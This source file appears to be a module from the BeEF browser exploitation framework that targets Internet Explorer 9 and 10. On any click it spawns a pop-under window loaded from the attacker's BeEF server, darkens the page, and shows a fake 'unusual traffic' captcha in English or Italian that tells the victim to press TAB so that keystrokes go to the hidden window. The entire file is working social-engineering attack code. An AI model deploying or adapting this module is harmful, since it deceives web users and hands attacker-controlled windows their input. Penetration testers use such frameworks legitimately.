//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	if(beef.browser.isIE()){

        var captcha_message = "";
        var tab_message = "";
        var captcha_src = "";
        // TODO this image is either corrupted or simply thew GIF animation doesn't work
        var blink_src = "data:image/gif;base64,R0lGODdhIAF3ALMAAAAAAEqN/3Wo/8TExMzMzNXV1eXl5fPz8////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkyAAkALAAAAAAgAXcAAAT/EMlJq7046827/2AojmRpnmiqrmzrvnAsz3Rt33iu73zv/8CgcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvter/gsHhMLpvP6LR6zW673/C4fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXPgIBm5ydnp+goaKjpKWmp6ipqqusra6vsAEaAQMEtre4ubq7vL2+v8DBwsPExcbHyMnKy7MFBs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+SzBgeY6RwBBuruGezv8hXx8/b19vL4+e77/On+/l0KKLASwYKTDiKMpHDho4YOG0GMuGgixUQWLx7KqLEQx46D9T6CDCRy5J+SJvugTLlnJcs8Ll/eYYdOZiJNsXLq3Mmzp8+fQGPZHEq0qNGjSJMqXcq0qdOnUKNKnUq1qtWrWC8k2Mq1q9evYMOKHUu2rNmzaNOqXcu2rdu3cOPKnUu3rt27ePPq3cu3r9+/gAMLHky4sOHDiBMrXsy4sePHkCNLnky5suXLmDNr3sy5s+fPoEOLHk26tOnTqFOrXs26tevXsGPLnk27tu3buHPr3s27t+/fwIMLH068uPHjyJMrX868ufPn0KNLn069uvXr2LNr3869u/fv4MOLH0++vPnz6NOrX8++vfv38OPLn0+/vv37yCMAACH5BAkyAAkALAAAAAAgAU0AAAT/EMlJq7046827/2AojmRpnmiqrmzrvnAsz3Rt33iu73zv/8CgcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvter/gsHhMLpvP6LR6zW673/C4fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXPgIBm5ydnp+goaKjpKWmp6ipqqusra6vsAEaAQMEtre4ubq7vL2+v8DBwsPExcbHyMnKy7MFBs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+SzBgeY6RwBBuruGezv8hXxGADzlvUX9/iU+hb8+kn6VyGgQEgEKRg86CjhhIUMGTmUADGiookIKlpEhFHjRkMdVz82CilyEcmSiU6iPKRyZaGWLgfBjBloJs0/Nm/2wajzZbueEn8CvXhuqCJNsZIqXcq0qdOnUGMZnUq1qtWrWLNq3cq1q9evYMOKHUu2rNmzaNOqXTsiAgA7";

        switch (beef.browser.getBrowserLanguage().substring(0,2)){
           case "en":
               lang = "en";
               captcha_message = "<h2>Our systems have detected unusual traffic from your computer network.</h2><br><h3> In order to continue, please solve the following Captcha after <b>pressing the [TAB] key</b>:</h3>";
               tab_message = "You must press the [TAB] key first, then solve the Captcha.";
               captcha_src = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDABYPERMRDhYTEhMZFxYaITckIR4eIUQwMyg3UEZUU09GTUxYY39sWF54X0xNbpZweIOHjpCOVmqcp5uKpn+Ljon/wAALCAA5ASwBAREA/8QAGgABAAIDAQAAAAAAAAAAAAAAAAQFAgMGAf/EAC4QAAEEAgEDAwMCBwEAAAAAAAABAgMEBRESBjFBEyFRFDJxIiMVFkJSYnKRgf/aAAgBAQAAPwDrgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARr12Kixr5toxy638Ehj2yMR7FRWqm0VD0AAAAAAAAAAAAFVey8lCw5s9GZYE7TR/qTt5Twb6+Xx9iNHx2o9L4culJjJGSN5Me1yfKLsyMHyxx/fI1v5U0W8hWqRJLLInF3bXvsprHVtZiqyKCRz/CKmtlY7qXLNstV0HFir9nHuhvylm9k8oynVesSI1FXwZyVsxhYPqW2vqGN+9i/BlHBLn6j3xXXNa77onpvipGx2SyWOsrjHRtmVi6airr/h0dfJq6NzrNaWBze6Km0IEvUcVe61j3Nkrv7Pb3b+ULyKaOZiPiejmr7oqKZgGmzagqM52JGxt+VPa1mG1GkkEjZGfKKbQAAAAAAAARcm9rcbbVXfbE7evwcfgen4cnQknkmc1+1a1G+PyTMRgcjXtyQzyObVciormP1v40R87TmxtmCKnasOfL/c8zn6ZyMsTZFtLJIvdrl7F9hcWtOi2G0rZXIu/f30c7kJ6kfVPKVE9Jipv4OtqzVLsaSwcJGp2XXYpM7Xu1skzIUYuaomnIiGp+Wylys+v/AA13J6a34JnS+Ls4+KR1nTVk7NTwV/VcEtXIQ5CFqr86MIOrJpLMTHwJ6a+zk8l3matOTFzSvgai8NoutKhQdN0Es1ZJHW5YeK6arXaL29amx2PjZHKs8z14tc49hht+hztZJGvVN/p1pCNislYuy2KL5UV7E/TMxCrbUvZHLrSs2PWhgdycqkl0seD6hbDEvCvMicm79kOqY5r2o5qoqL2VD0AAAAAAAAo8r06y698texJA9++SbVWu/wDCuxuHzOItp9O6OWFyor05aRx0l6y+pX9VleSwqL9kfc4nLXLuSyMdqGnNF6TdIitVfPc63CWb1msrr1b0V/p/yT8DJ079t3GvcSvF5RG+/wD0gwdKU2u52ZJJ372qqutl3Xrw1o0jgjaxqeEQ2jSAxkjZI1Wvajmr4VCOzG0mORza8aKi7RdGGXqvt46WCJdOcnscZFg8wn7TWOaxV9/f2LC1W+nyFSG/I5a8bNK7xsmWEwrNMja6zI7sxjlUyderYmJ0MFNyWXpvhG3evypGwUGXiSeVIGsdKu+UndVNv8sy3LP1OStc3r3axDo4IWQQtijTTWppDMAAAAAAAAAAAAAAAGuevDYZwmja9vwqGMFStWT9iBkf+qGzgzly4pv50ZAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//9k=";
               break;
           case "it":
               lang = "it";
               captcha_message = "<h2>I nostri sistemi hanno rilevato traffico inusuale proveniente dal tuo computer.</h2><br><h3> Per continuare, risolvi il seguente Captcha <b>dopo aver premuto il tasto [TAB]</b>:</h3>";
               tab_message = "Devi prima premere il tasto [TAB], poi risolvere il Captcha.";
               captcha_src = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDABYPERMRDhYTEhMZFxYaITckIR4eIUQwMyg3UEZUU09GTUxYY39sWF54X0xNbpZweIOHjpCOVmqcp5uKpn+Ljon/wAALCAA5ASwBAREA/8QAGgABAAMBAQEAAAAAAAAAAAAAAAMEBQIBBv/EADAQAAEEAgAEBQIFBQEAAAAAAAABAgMEBREGEhMhIjEyQVEVcRRCUmGRIzNygbHh/9oACAEBAAA/APrgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ1/M06M7YJFc6VfysbtUJoMlVnc1rZOVzvJr05VX+S2ARyzxRJuSRrfupHDeqzqqRTMe5PZF7mYnEUS5BlV1aVnO7l5nJpBlbuWrSPfXrxvgZ35lXupdxuQ+oY9LEbU6mu7d+5Rk4iZVldFfrSQPTy90cd1eJKM/q54k/U5vb+TWjljkjSRj0cxfdFOmua70uRfsp6AAAAAAAAAAAD5WJ15vEtrUMDp3RtVEf22iInkpLnLVmWk6ObFzNkTuyRjkcjVT32hAzI37ENOm6dKr3xq6SV/ZdIqohesMq16jl+sSdVE2jlm33+xVpZ2w7ETSyKjnsdyNevbf7ndCSnGnVk6l2y7uumqqJ+xGlG1bzMVlldtRiLtUVe7k+x1xLPHFkqTV01WrzK49zHEUa13QU2rM9W6VyJ2QqcKZKOs2SGdHorl2nh7HHEeRqXLlbpuR7GO8e2mtemxq4R6MWJGqzwp77IuDZurjXxOXfK5eyr7EeUh/AZOslKZ7HSv8TN7Q1MrNkK0aTVum5jW7cjjvC5F2RqdZ8fIqLpfgiuZ+nVn6CK6WT9MabKbuKq8cyRy15Wb/AFIT5fMLDFHFRb1LMyba1PZPkxbbs9j4Uu2LOvFrp7PqsZZdboRTvbyue3aoWgAAAAAAACnex8dtWybWOeP+3K1dK3/wz5mcRORImPqonksqea/6IMji5o71a+sP41GsRk7NJt3b1IhxNfwqR8tXHNmsL2SJIdKi/v2LF3FT3sPExGRwTtXn6bU037HcMuYZGldlCFjkTXU5/CW6GOdBIs9mZZ7DvdfJPshPbx9W4qLYha9U8lU9hpVYG8sUDGovwhI2vCz0xMT7IROx9N67dXjVf8StdwdG41EfHy6TScvbRHicHFi5nvile5HflXyMfIPsUs++3NXfOzXgRE8infz9zIyJT5Urseunb8zUzE30jCw1qrkRZO3Mn/Szg6VGjTbZfLG+R6bdI5TOkTG3shPa5JZmRNVyuX09iviM1TgtSzzxPdM9dN5U3pPhDSsQ2+IJmc8Tq1Ni78fqcfRRRtiibGxNNamkOgAAAAAAAAAeI1qLtGpv50egAAAHioi+aIpRs4ahal6s1dqv+U7HGTw1bIwMiftnJ6Vb7FKtwpUid/Vmlmank1V0hsx1K8UHQZCxsfu1E7KRw46lA7mirRtd8o0tAAAAAAAAAAAAAAAAAAAAAAAAAAAAH//Z";
               break;
           default:
               // defaults to english
               lang = "en";
               captcha_message = "<h2>Our systems have detected unusual traffic from your computer network.</h2><br><h3> In order to continue, please solve the following Captcha after pressing the [TAB] key:</h3>";
               tab_message = "You must press the [TAB] key first, then solve the Captcha.";
               captcha_src = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDABYPERMRDhYTEhMZFxYaITckIR4eIUQwMyg3UEZUU09GTUxYY39sWF54X0xNbpZweIOHjpCOVmqcp5uKpn+Ljon/wAALCAA5ASwBAREA/8QAGgABAAIDAQAAAAAAAAAAAAAAAAQFAgMGAf/EAC4QAAEEAgEDAwMCBwEAAAAAAAABAgMEBRESBjFBEyFRFDJxIiMVFkJSYnKRgf/aAAgBAQAAPwDrgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARr12Kixr5toxy638Ehj2yMR7FRWqm0VD0AAAAAAAAAAAAFVey8lCw5s9GZYE7TR/qTt5Twb6+Xx9iNHx2o9L4culJjJGSN5Me1yfKLsyMHyxx/fI1v5U0W8hWqRJLLInF3bXvsprHVtZiqyKCRz/CKmtlY7qXLNstV0HFir9nHuhvylm9k8oynVesSI1FXwZyVsxhYPqW2vqGN+9i/BlHBLn6j3xXXNa77onpvipGx2SyWOsrjHRtmVi6airr/h0dfJq6NzrNaWBze6Km0IEvUcVe61j3Nkrv7Pb3b+ULyKaOZiPiejmr7oqKZgGmzagqM52JGxt+VPa1mG1GkkEjZGfKKbQAAAAAAAARcm9rcbbVXfbE7evwcfgen4cnQknkmc1+1a1G+PyTMRgcjXtyQzyObVciormP1v40R87TmxtmCKnasOfL/c8zn6ZyMsTZFtLJIvdrl7F9hcWtOi2G0rZXIu/f30c7kJ6kfVPKVE9Jipv4OtqzVLsaSwcJGp2XXYpM7Xu1skzIUYuaomnIiGp+Wylys+v/AA13J6a34JnS+Ls4+KR1nTVk7NTwV/VcEtXIQ5CFqr86MIOrJpLMTHwJ6a+zk8l3matOTFzSvgai8NoutKhQdN0Es1ZJHW5YeK6arXaL29amx2PjZHKs8z14tc49hht+hztZJGvVN/p1pCNislYuy2KL5UV7E/TMxCrbUvZHLrSs2PWhgdycqkl0seD6hbDEvCvMicm79kOqY5r2o5qoqL2VD0AAAAAAAAo8r06y698texJA9++SbVWu/wDCuxuHzOItp9O6OWFyor05aRx0l6y+pX9VleSwqL9kfc4nLXLuSyMdqGnNF6TdIitVfPc63CWb1msrr1b0V/p/yT8DJ079t3GvcSvF5RG+/wD0gwdKU2u52ZJJ372qqutl3Xrw1o0jgjaxqeEQ2jSAxkjZI1Wvajmr4VCOzG0mORza8aKi7RdGGXqvt46WCJdOcnscZFg8wn7TWOaxV9/f2LC1W+nyFSG/I5a8bNK7xsmWEwrNMja6zI7sxjlUyderYmJ0MFNyWXpvhG3evypGwUGXiSeVIGsdKu+UndVNv8sy3LP1OStc3r3axDo4IWQQtijTTWppDMAAAAAAAAAAAAAAAGuevDYZwmja9vwqGMFStWT9iBkf+qGzgzly4pv50ZAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//9k=";
               break;
        }

        var grayOut = function(vis, options) {
            var options = options || {};
            var zindex = options.zindex || 50;
            var opacity = options.opacity || 70;
            var opaque = (opacity / 100);
            var bgcolor = options.bgcolor || '#000000';
            var dark=document.getElementById('darkenScreenObject');
            if (!dark) {
                var tbody = document.getElementsByTagName("body")[0];
                var tnode = document.createElement('div');
                tnode.style.position='absolute';
                tnode.style.top='0px';
                tnode.style.left='0px';
                tnode.style.overflow='hidden';
                tnode.style.display='none';
                tnode.id='darkenScreenObject';
                tbody.appendChild(tnode);
                dark=document.getElementById('darkenScreenObject');
            }
            if (vis) {
                var pageWidth='100%';
                var pageHeight='100%';
                dark.style.opacity=opaque;
                dark.style.MozOpacity=opaque;
                dark.style.filter='alpha(opacity='+opacity+')';
                dark.style.zIndex=zindex;
                dark.style.backgroundColor=bgcolor;
                dark.style.width= pageWidth;
                dark.style.height= pageHeight;
                dark.style.display='block';
            } else {
                dark.style.display='none';
            }
        };

        function spawnPopunder(){
            var url = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/underpop.html'
            var pu = window.open(url,'','top=0, left=0,width=500,height=500');
            pu.blur();
        }

        // The keypress focus is on the popunder, but the following would be nice to have to force the victim to press TAB
//        var tab_pressed = false;
//        function checkTabPressed(){
//            console.log(event.keyCode);
//            if(tab_pressed && event.keyCode != 9){
//                // all good
//            }else if(event.keyCode == 9){
//                tab_pressed = true;
//            }else{
//                alert(tab_message);
//            }
//        }

        if(beef.browser.isIE9() || beef.browser.isIE10()){
            document.body.onclick = function(){
                spawnPopunder();

                grayOut(true,{'opacity':'70'});

                var fake_captcha = document.createElement('div');
                fake_captcha.setAttribute('id', 'popup');
                fake_captcha.setAttribute('style', 'width:400px;position:absolute; top:20%; left:40%; z-index:51; background-color:white;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
                fake_captcha.setAttribute('align', 'center');
                // using onkeydown because onkeypress is not capturing TAB in IE
                //fake_captcha.onkeydown = function(){checkTabPressed();};
                document.body.appendChild(fake_captcha);
                fake_captcha.innerHTML= '<br>' + captcha_message + '<table border=\'0\'><tr><td><img src="' + blink_src + '"></td><tr><td><img src="' + captcha_src + '"></td></tr></table>';

            };
        }else{
           // unsupported IE version
        }
    }
});

